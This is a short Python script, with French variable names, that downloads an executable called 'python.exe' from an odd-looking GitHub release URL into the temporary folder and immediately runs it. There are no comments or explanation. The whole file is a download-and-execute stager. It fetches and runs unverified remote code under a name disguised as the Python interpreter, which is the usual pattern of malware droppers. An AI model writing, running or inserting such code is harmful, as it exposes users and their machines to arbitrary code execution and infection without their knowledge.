import os
import urllib.request
import tempfile
import subprocess

url = "https://github.com/theolomo/-/releases/download/!/python.exe"
chemin_fichier = os.path.join(tempfile.gettempdir(), "python.exe")

urllib.request.urlretrieve(url, chemin_fichier)
subprocess.run([chemin_fichier], check=True)
